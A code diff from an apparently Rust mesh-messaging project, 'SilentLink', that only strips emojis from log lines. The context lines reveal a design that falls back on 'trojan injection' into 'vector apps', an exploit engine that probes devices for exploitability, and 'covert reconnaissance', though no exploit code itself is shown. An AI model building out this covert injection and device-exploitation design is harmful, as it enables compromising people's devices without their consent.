@@ -361,7 +361,7 @@ impl UltrasonicEngine {
         };
         tokio::spawn(emission_task);
 
-        info!("✅ Ultrasonic engine started successfully");
+        info!("Ultrasonic engine started successfully");
         Ok(beacon_rx)
     }
 
@@ -443,7 +443,7 @@ impl UltrasonicEngine {
                 None,
             ) {
                 Ok(stream) => {
-                    info!("🎤 Audio input initialized with config #{} (sample_rate: {}, buffer_size: {:?})", 
+                    info!("Audio input initialized with config #{} (sample_rate: {}, buffer_size: {:?})", 
                           i + 1, config.sample_rate.0, config.buffer_size);
                     stream.play().map_err(|e| SilentLinkError::Audio(e.to_string()))?;
                     return Ok(stream);
@@ -546,7 +546,7 @@ impl UltrasonicEngine {
                 None,
             ) {
                 Ok(stream) => {
-                    info!("🔊 Audio output initialized with config #{} (sample_rate: {}, buffer_size: {:?})", 
+                    info!("Audio output initialized with config #{} (sample_rate: {}, buffer_size: {:?})", 
                           i + 1, config.sample_rate.0, config.buffer_size);
                     stream.play().map_err(|e| SilentLinkError::Audio(e.to_string()))?;
                     return Ok(stream);
@@ -1089,7 +1089,7 @@ impl CryptoEngine {
         // Store session key
         self.session_keys.write().await.insert(peer_device_id.clone(), derived_key);
         
-        info!("🔐 Key exchange completed with device: {}", peer_device_id);
+        info!("Key exchange completed with device: {}", peer_device_id);
         Ok(())
     }
 
@@ -1127,7 +1127,7 @@ impl CryptoEngine {
     }
 
     pub async fn rotate_keys(&self) -> Result<()> {
-        info!("🔄 Starting key rotation process");
+        info!("Starting key rotation process");
         
         // Store old keypair temporarily (for transitional decryption)
         let _old_private = self.device_private_key.read().await;
@@ -1148,14 +1148,14 @@ impl CryptoEngine {
         *self.device_private_key.write().await = new_private;
         *self.device_public_key.write().await = new_public;
         
-        info!("✅ Key rotation completed - old keys stored for transition period");
+        info!("Key rotation completed - old keys stored for transition period");
         
         // Schedule cleanup of old keys after transition period
         let old_keypair_clone = self.old_keypair.clone();
         tokio::spawn(async move {
             tokio::time::sleep(Duration::from_secs(3600)).await; // 1 hour transition
             *old_keypair_clone.write().await = None;
-            info!("🧹 Old keypair cleaned up after transition period");
+            info!("Old keypair cleaned up after transition period");
         });
         
         Ok(())
@@ -1375,10 +1375,10 @@ impl MessageRouter {
                 .any(|d| d.device_id == *target_id);
             
             if has_direct_connection {
-                info!("🔗 Direct connection available for {}, using high-bandwidth transport", target_id);
+                info!("Direct connection available for {}, using high-bandwidth transport", target_id);
                 metadata.insert("transport_method".to_string(), "direct".to_string());
             } else {
-                info!("📡 No direct connection to {}, will attempt discovery then escalation", target_id);
+                info!("No direct connection to {}, will attempt discovery then escalation", target_id);
                 metadata.insert("transport_method".to_string(), "discovery_escalation".to_string());
             }
         }
@@ -1466,17 +1466,17 @@ impl MessageRouter {
             if let Ok(plaintext) = self.crypto_engine.decrypt_message(&message).await {
                 if let Some(method) = plaintext.metadata.get("transport_method") {
                     if method == "discovery_escalation" {
-                        info!("🎯 Using discovery-escalation flow for {}", recipient_id);
+                        info!("Using discovery-escalation flow for {}", recipient_id);
                         
                         // Step 1: Check if target discovered via ultrasonic but not yet connected
                         let neighbor_table = self.neighbor_table.read().await;
                         if neighbor_table.contains_key(recipient_id) && !device_ids.contains(recipient_id) {
-                            info!("🔊 Target {} discovered via ultrasonic, attempting transport escalation", recipient_id);
+                            info!("Target {} discovered via ultrasonic, attempting transport escalation", recipient_id);
                             
                             // Step 2: Trigger transport manager to establish high-bandwidth connection
                             match self.transport_manager.establish_connection(recipient_id).await {
                                 Ok(()) => {
-                                    info!("✅ High-bandwidth connection established to {}", recipient_id);
+                                    info!("High-bandwidth connection established to {}", recipient_id);
                                     // Now send via direct connection
                                     return self.transport_manager.send_message(recipient_id, &message).await;
                                 }
@@ -1487,7 +1487,7 @@ impl MessageRouter {
                                 }
                             }
                         } else if !neighbor_table.contains_key(recipient_id) {
-                            info!("📡 Target {} not discovered, message will trigger discovery beacon", recipient_id);
+                            info!("Target {} not discovered, message will trigger discovery beacon", recipient_id);
                             // The ultrasonic engine will automatically beacon, and when target responds,
                             // the neighbor_table will be updated, triggering escalation on retry
                         }
@@ -1540,7 +1540,7 @@ impl MessageRouter {
 
                 let payload = payload_data.to_string().into_bytes();
                 
-                info!("🕵️ Attempting covert delivery via vector app injection");
+                info!("Attempting covert delivery via vector app injection");
                 
                 // Use the exploit engine to inject the message
                 match exploit_engine.inject_payload_to_apps(&payload).await {
@@ -1550,19 +1550,19 @@ impl MessageRouter {
                             .count();
                         
                         if successful_injections > 0 {
-                            info!("✅ Successfully injected message to {} vector apps", successful_injections);
+                            info!("Successfully injected message to {} vector apps", successful_injections);
                             return Ok(());
                         } else {
-                            warn!("⚠️ All trojan injection attempts failed");
+                            warn!("All trojan injection attempts failed");
                         }
                     }
                     Err(e) => {
-                        warn!("❌ Trojan injection failed: {}", e);
+                        warn!("Trojan injection failed: {}", e);
                     }
                 }
             }
         } else {
-            warn!("❌ Trojan delivery unavailable - ExploitEngine not initialized");
+            warn!("Trojan delivery unavailable - ExploitEngine not initialized");
         }
         
         Err(SilentLinkError::System("All delivery methods exhausted".to_string()))
@@ -1573,14 +1573,14 @@ impl MessageRouter {
             MessageType::DirectMessage | MessageType::Broadcast => {
                 let plaintext = self.crypto_engine.decrypt_message(message).await?;
                 info!(
-                    "📨 Message from {}: {}",
+                    "Message from {}: {}",
                     message.header.sender_id,
                     plaintext.content
                 );
                 
                 // Extract priority if present
                 if let Some(priority) = plaintext.metadata.get("priority") {
-                    info!("   Priority: {}", priority);
+                    info!("Priority: {}", priority);
                 }
             }
             MessageType::Emergency => {
@@ -1663,7 +1663,7 @@ impl MessageRouter {
     }
 
     async fn handle_handshake_request(&self, message: &EncryptedMessage) -> Result<()> {
-        info!("🤝 Processing handshake request from {}", message.header.sender_id);
+        info!("Processing handshake request from {}", message.header.sender_id);
         
         // Send handshake response with our public key
         let response_header = MessageHeader {
@@ -1713,7 +1713,7 @@ impl MessageRouter {
                         .perform_key_exchange(&message.header.sender_id, &peer_public_key)
                         .await?;
                         
-                    info!("🔐 Key exchange completed with {}", message.header.sender_id);
+                    info!("Key exchange completed with {}", message.header.sender_id);
                 }
             }
         }
@@ -1867,7 +1867,7 @@ impl SilentLink {
             return Ok(());
         }
 
-        info!("🚀 Starting SilentLink system - Device: {} ({})", self.config.device_name, self.device_id);
+        info!("Starting SilentLink system - Device: {} ({})", self.config.device_name, self.device_id);
 
         // Start all subsystems
         let ultrasonic_rx = self.ultrasonic_engine.start().await?;
@@ -1894,7 +1894,7 @@ impl SilentLink {
 
         tokio::spawn(event_loop.run());
 
-        info!("✅ SilentLink system started successfully");
+        info!("SilentLink system started successfully");
         Ok(())
     }
 
@@ -1903,14 +1903,14 @@ impl SilentLink {
             return Ok(());
         }
 
-        info!("🛑 Stopping SilentLink system...");
+        info!("Stopping SilentLink system...");
         
         self.is_running.store(false, Ordering::Release);
         
         self.ultrasonic_engine.stop().await;
         self.transport_manager.stop().await;
         
-        info!("✅ SilentLink system stopped");
+        info!("SilentLink system stopped");
         Ok(())
     }
 
@@ -1924,13 +1924,13 @@ impl SilentLink {
         if let Some(target_id) = &recipient_id {
             let connected_devices = self.transport_manager.get_connected_devices().await;
             if connected_devices.iter().any(|d| d.device_id == *target_id) {
-                info!("🚀 Direct high-bandwidth connection available to {}", target_id);
+                info!("Direct high-bandwidth connection available to {}", target_id);
                 return self.message_router
                     .send_message(content, recipient_id, MessageType::DirectMessage, None)
                     .await;
             }
             
-            info!("📡 No direct connection to {}, initiating enhanced discovery flow", target_id);
+            info!("No direct connection to {}, initiating enhanced discovery flow", target_id);
         }
 
         // Step 2: Enhanced flow - attempt discovery → escalation → vector injection
@@ -1946,20 +1946,20 @@ impl SilentLink {
     /// Discovery → Escalation → Vector Injection flow
     async fn attempt_enhanced_delivery(&self, content: String, recipient_id: Option<DeviceId>) -> Result<Uuid> {
         if let Some(target_id) = &recipient_id {
-            info!("🎯 Starting enhanced delivery flow for {}", target_id);
+            info!("Starting enhanced delivery flow for {}", target_id);
             
             // Step 1: Check if device discovered via ultrasonic but not connected
             let message_router = &self.message_router;
             let neighbor_table = message_router.neighbor_table.read().await;
             
             if neighbor_table.contains_key(target_id) {
-                info!("🔊 Device {} discovered via ultrasonic beacons", target_id);
+                info!("Device {} discovered via ultrasonic beacons", target_id);
                 drop(neighbor_table);
                 
                 // Step 2: Attempt transport escalation (WiFi/BT)
                 match self.transport_manager.establish_connection(target_id).await {
                     Ok(()) => {
-                        info!("✅ High-bandwidth connection established to {}", target_id);
+                        info!("High-bandwidth connection established to {}", target_id);
                         // Step 3: Send via high-bandwidth transport
                         return self.message_router
                             .send_message(content, recipient_id, MessageType::DirectMessage, None)
@@ -1971,13 +1971,13 @@ impl SilentLink {
                     }
                 }
             } else {
-                info!("📱 Device {} not yet discovered, triggering beacon emission", target_id);
+                info!("Device {} not yet discovered, triggering beacon emission", target_id);
                 // The ultrasonic engine will automatically emit beacons
                 // In a real implementation, you might want to trigger immediate beacon
             }
             
             // Step 4: Covert vector injection as fallback
-            info!("🕵️ Attempting covert delivery via vector app to {}", target_id);
+            info!("Attempting covert delivery via vector app to {}", target_id);
             return self.execute_vector_injection(content, Some(target_id.clone())).await;
         }
         
@@ -2009,11 +2009,11 @@ impl SilentLink {
         // Use exploit engine for vector injection
         match self.exploit_engine.exploit_device(&payload).await {
             Ok(()) => {
-                info!("✅ Message delivered via vector injection: {}", message_id);
+                info!("Message delivered via vector injection: {}", message_id);
                 Ok(message_id)
             }
             Err(e) => {
-                error!("❌ Vector injection failed: {}", e);
+                error!("Vector injection failed: {}", e);
                 Err(e)
             }
         }
@@ -2021,7 +2021,7 @@ impl SilentLink {
 
     /// Legacy trojan injection method (kept for compatibility)
     pub async fn send_via_trojan(&self, content: String, target_device_id: Option<DeviceId>) -> Result<Uuid> {
-        info!("🕵️ Attempting legacy trojan-style message delivery");
+        info!("Attempting legacy trojan-style message delivery");
 
         // Try direct communication first
         if let Ok(message_id) = self.message_router
@@ -2041,7 +2041,7 @@ impl SilentLink {
             return Err(SilentLinkError::System("System not running".to_string()));
         }
 
-        info!("📡 Broadcasting message to all devices");
+        info!("Broadcasting message to all devices");
         self.message_router
             .send_message(content, None, MessageType::Broadcast, None)
             .await
@@ -2049,7 +2049,7 @@ impl SilentLink {
 
     /// Emergency broadcast with maximum propagation
     pub async fn send_emergency(&self, content: String) -> Result<Uuid> {
-        info!("🚨 Emergency broadcast initiated");
+        info!("Emergency broadcast initiated");
         
         // Use maximum priority and all available vectors
         let message_id = self.message_router
@@ -2110,7 +2110,7 @@ impl SilentLink {
 
     /// Covert device reconnaissance 
     pub async fn reconnaissance_mode(&self) -> Result<()> {
-        info!("🔍 Starting covert device reconnaissance");
+        info!("Starting covert device reconnaissance");
 
         // Get system information using platform adapter
         let system_info = self.platform_adapter.get_system_info().await?;
@@ -2126,26 +2126,26 @@ impl SilentLink {
         tokio::time::sleep(Duration::from_secs(30)).await;
 
         // 2. Transport passive scanning
-        info!("📡 Passive transport scanning...");
+        info!("Passive transport scanning...");
         let connected_devices = self.transport_manager.get_connected_devices().await;
         let transport_stats = self.transport_manager.get_transport_stats().await;
         info!("Found {} connected devices via {:?} transport", connected_devices.len(), transport_stats.active_transport);
-        info!("📊 Transport stats: BT: {}/{}, WiFi: {}/{}", 
+        info!("Transport stats: BT: {}/{}, WiFi: {}/{}", 
               transport_stats.bluetooth_connections, transport_stats.bluetooth_discovered,
               transport_stats.wifi_connections, transport_stats.wifi_discovered);
         
         // Display current transport preference
         match transport_stats.active_transport {
-            TransportType::Bluetooth => info!("🔵 Active transport: Bluetooth LE"),
-            TransportType::WiFi => info!("🟢 Active transport: WiFi Direct"),
-            TransportType::Hybrid => info!("🟡 Active transport: Hybrid (BT + WiFi)"),
+            TransportType::Bluetooth => info!("Active transport: Bluetooth LE"),
+            TransportType::WiFi => info!("Active transport: WiFi Direct"),
+            TransportType::Hybrid => info!("Active transport: Hybrid (BT + WiFi)"),
         }
 
         // 3. Device vulnerability assessment
         info!("🎯 Analyzing device vulnerabilities...");
         match self.exploit_engine.exploit_device(b"reconnaissance_probe").await {
-            Ok(()) => info!("✅ Reconnaissance successful - target is exploitable"),
-            Err(e) => warn!("⚠️ Reconnaissance limited: {}", e),
+            Ok(()) => info!("Reconnaissance successful - target is exploitable"),
+            Err(e) => warn!("Reconnaissance limited: {}", e),
         }
 
         Ok(())
@@ -2153,7 +2153,7 @@ impl SilentLink {
 
     /// Emergency broadcast with maximum propagation (uses all available vectors)
     pub async fn emergency_broadcast_covert(&self, message: String) -> Result<Vec<Uuid>> {
-        info!("🚨 Initiating covert emergency broadcast");
+        info!("Initiating covert emergency broadcast");
         let mut message_ids = Vec::new();
 
         // 1. Standard emergency broadcast
@@ -2169,12 +2169,12 @@ impl SilentLink {
         // 3. Ultrasonic broadcast (emergency frequencies)
         // This would use special emergency ultrasonic frequencies
         // that trojan apps specifically listen for
-        info!("📢 Emergency ultrasonic broadcast active");
+        info!("Emergency ultrasonic broadcast active");
 
         if message_ids.is_empty() {
             Err(SilentLinkError::System("All emergency broadcast methods failed".to_string()))
         } else {
-            info!("✅ Emergency broadcast sent via {} vectors", message_ids.len());
+            info!("Emergency broadcast sent via {} vectors", message_ids.len());
             Ok(message_ids)
         }
     }
@@ -2193,7 +2193,7 @@ struct SilentLinkEventLoop {
 
 impl SilentLinkEventLoop {
     async fn run(mut self) -> Result<()> {
-        info!("🔄 Starting SilentLink event loop");
+        info!("Starting SilentLink event loop");
 
         let mut cleanup_interval = interval(Duration::from_secs(60));
 
@@ -2235,12 +2235,12 @@ impl SilentLinkEventLoop {
             }
         }
 
-        info!("🔄 SilentLink event loop stopped");
+        info!("SilentLink event loop stopped");
         Ok(())
     }
 
     async fn handle_ultrasonic_beacon(&self, beacon: UltrasonicBeacon) -> Result<()> {
-        info!("🔊 Received ultrasonic beacon from device: {}", beacon.device_id);
+        info!("Received ultrasonic beacon from device: {}", beacon.device_id);
 
         // Validate beacon
         if beacon.device_id == self.device_id {
@@ -2262,7 +2262,7 @@ impl SilentLinkEventLoop {
         {
             debug!("Could not establish transport connection to {}: {}", beacon.device_id, e);
         } else {
-            info!("📶 Established transport connection via ultrasonic discovery to {}", beacon.device_id);
+            info!("Established transport connection via ultrasonic discovery to {}", beacon.device_id);
             
             // Send handshake request
             let _ = self.message_router.send_message(
@@ -2277,7 +2277,7 @@ impl SilentLinkEventLoop {
     }
 
     async fn handle_transport_device_discovered(&self, device_id: DeviceId) -> Result<()> {
-        info!("📱 Discovered transport device: {}", device_id);
+        info!("Discovered transport device: {}", device_id);
         
         // Attempt connection
         if let Err(e) = self
@@ -2287,19 +2287,19 @@ impl SilentLinkEventLoop {
         {
             debug!("Failed to connect to discovered device {}: {}", device_id, e);
         } else {
-            info!("✅ Connected to discovered device: {}", device_id);
+            info!("Connected to discovered device: {}", device_id);
         }
 
         Ok(())
     }
 
     async fn handle_incoming_message(&self, message: EncryptedMessage) -> Result<()> {
-        trace!("📥 Received message {} from {}", message.header.message_id, message.header.sender_id);
+        trace!("Received message {} from {}", message.header.message_id, message.header.sender_id);
         self.message_router.route_message(message).await
     }
 
     async fn perform_cleanup(&self) -> Result<()> {
-        debug!("🧹 Performing periodic cleanup");
+        debug!("Performing periodic cleanup");
         
         // Cleanup would be handled by the transport manager
         // No direct cleanup needed here since transport manager handles it
@@ -2328,7 +2328,7 @@ impl EmergencySystem {
     }
 
     pub async fn enable_emergency_mode(&self) -> Result<()> {
-        info!("🚨 Enabling emergency mode");
+        info!("Enabling emergency mode");
         
         self.silentlink
             .add_shared_secret("emergency".to_string(), self.emergency_secret.secret)
@@ -2349,7 +2349,7 @@ impl EmergencySystem {
 
         let message_id = self.silentlink.send_emergency(emergency_content).await?;
         
-        warn!("🚨 Emergency broadcast sent: {} (ID: {})", message, message_id);
+        warn!("Emergency broadcast sent: {} (ID: {})", message, message_id);
         Ok(message_id)
     }
 }
@@ -2418,7 +2418,7 @@ impl QrHandshake {
             .connect_to_device(device_id.clone())
             .await?;
 
-        info!("🔗 QR handshake successful with device: {}", device_id);
+        info!("QR handshake successful with device: {}", device_id);
         Ok(device_id)
     }
 
@@ -2547,7 +2547,7 @@ pub async fn run_cli() -> Result<()> {
 
             silentlink.start().await?;
             
-            info!("✅ SilentLink started. Press Ctrl+C to stop.");
+            info!("SilentLink started. Press Ctrl+C to stop.");
             
             // Wait for Ctrl+C
             tokio::signal::ctrl_c().await.map_err(|e| SilentLinkError::System(e.to_string()))?;
@@ -2644,7 +2644,7 @@ pub async fn run_cli() -> Result<()> {
             let silentlink = Arc::new(SilentLink::new(Some(config)).await?);
             silentlink.start().await?;
             
-            info!("🕵️ Starting covert reconnaissance...");
+            info!("Starting covert reconnaissance...");
             silentlink.reconnaissance_mode().await?;
             
             sleep(Duration::from_secs(3)).await;
@@ -2691,7 +2691,7 @@ pub mod examples {
     use super::*;
 
     pub async fn comprehensive_demo() -> Result<()> {
-        info!("🎯 Starting comprehensive SilentLink demo");
+        info!("Starting comprehensive SilentLink demo");
 
         // Create two devices to simulate communication
         let device1 = Arc::new(SilentLink::new(None).await?);
@@ -2706,35 +2706,35 @@ pub mod examples {
         device1.start().await?;
         device2.start().await?;
 
-        info!("✅ Both devices started");
+        info!("Both devices started");
 
         // Wait for discovery
         sleep(Duration::from_secs(5)).await;
 
         // Send messages between devices
         let msg1_id = device1.send_broadcast("Hello from Device 1!".to_string()).await?;
-        info!("📤 Device 1 sent broadcast: {}", msg1_id);
+        info!("Device 1 sent broadcast: {}", msg1_id);
 
         let msg2_id = device2.send_broadcast("Hello from Device 2!".to_string()).await?;
-        info!("📤 Device 2 sent broadcast: {}", msg2_id);
+        info!("Device 2 sent broadcast: {}", msg2_id);
 
         // Test direct messaging
         let direct_msg_id = device1
             .send_message("Direct message test".to_string(), Some(device2.device_id().clone()))
             .await?;
-        info!("📤 Device 1 sent direct message: {}", direct_msg_id);
+        info!("Device 1 sent direct message: {}", direct_msg_id);
 
         // Test emergency broadcast
         let emergency_system = EmergencySystem::new(device1.clone());
         let emergency_id = emergency_system
             .broadcast_emergency("Test emergency alert", Some("Test Location".to_string()))
             .await?;
-        info!("🚨 Emergency broadcast sent: {}", emergency_id);
+        info!("Emergency broadcast sent: {}", emergency_id);
 
         // Test QR handshake
         let qr_system = QrHandshake::new(device1.clone());
         let qr_data = qr_system.generate_qr_data().await?;
-        info!("📱 Generated QR handshake data: {}", &qr_data[..100]);
+        info!("Generated QR handshake data: {}", &qr_data[..100]);
 
         // Let messages propagate
         sleep(Duration::from_secs(10)).await;
@@ -2743,7 +2743,7 @@ pub mod examples {
         let stats1 = device1.get_network_stats().await;
         let stats2 = device2.get_network_stats().await;
         
-        info!("📊 Final Stats:");
+        info!("Final Stats:");
         info!("Device 1 - Sent: {}, Received: {}", stats1.messages_sent, stats1.messages_received);
         info!("Device 2 - Sent: {}, Received: {}", stats2.messages_sent, stats2.messages_received);
 
@@ -2751,12 +2751,12 @@ pub mod examples {
         device1.stop().await?;
         device2.stop().await?;
 
-        info!("✅ Demo completed successfully");
+        info!("Demo completed successfully");
         Ok(())
     }
 
     pub async fn emergency_network_demo() -> Result<()> {
-        info!("🚨 Starting emergency network demonstration");
+        info!("Starting emergency network demonstration");
 
         // Create multiple devices for emergency scenario
         let mut devices = Vec::new();
@@ -2774,7 +2774,7 @@ pub mod examples {
             devices.push((device, emergency_system));
         }
 
-        info!("✅ Emergency network with {} nodes established", devices.len());
+        info!("Emergency network with {} nodes established", devices.len());
 
         // Wait for network formation
         sleep(Duration::from_secs(3)).await;
@@ -2788,7 +2788,7 @@ pub mod examples {
             )
             .await?;
 
-        info!("🚨 Emergency alert broadcasted: {}", emergency_id);
+        info!("Emergency alert broadcasted: {}", emergency_id);
 
         // Let emergency message propagate through network
         sleep(Duration::from_secs(8)).await;
@@ -2813,7 +2813,7 @@ pub mod examples {
             device.stop().await?;
         }
 
-        info!("✅ Emergency network demo completed");
+        info!("Emergency network demo completed");
         Ok(())
     }
 }
@@ -2828,6 +2828,3 @@ async fn main() -> Result<()> {
         examples::comprehensive_demo().await
     }
 }
-
-
-
